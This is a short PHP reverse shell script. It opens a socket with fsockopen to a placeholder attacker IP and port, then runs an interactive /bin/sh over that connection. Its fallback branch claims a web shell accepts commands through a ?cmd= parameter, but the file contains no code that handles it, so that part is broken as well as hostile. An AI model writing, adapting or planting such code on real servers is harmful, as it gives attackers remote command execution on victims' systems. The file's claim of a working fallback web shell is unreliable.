<?php
$ip = '10.198.75.187';  // Replace with your IP
$port = '7777';         // Replace with your port

// Use fsockopen() to establish a reverse shell connection
if (function_exists('fsockopen')) {
    $socket = fsockopen($ip, $port);
    if ($socket) {
        shell_exec("/bin/sh -i <&3 >&3 2>&3");
    }
}
// Fallback web shell
else {
    echo "<pre>Web shell is available. Execute commands with ?cmd=your_command</pre>";
}
?>
